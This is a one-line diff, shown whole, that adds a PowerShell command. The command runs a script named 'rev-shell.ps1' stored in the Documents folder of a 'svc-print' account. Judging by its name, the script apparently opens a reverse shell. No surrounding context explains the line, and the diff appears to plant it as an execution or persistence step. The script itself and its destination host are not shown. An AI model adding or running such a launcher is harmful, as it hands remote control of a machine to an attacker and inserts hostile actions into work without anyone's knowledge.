@@ -1,0 +1,1 @@
+powershell -noexit "& ""C:\Users\svc-print\Documents\rev-shell.ps1"""
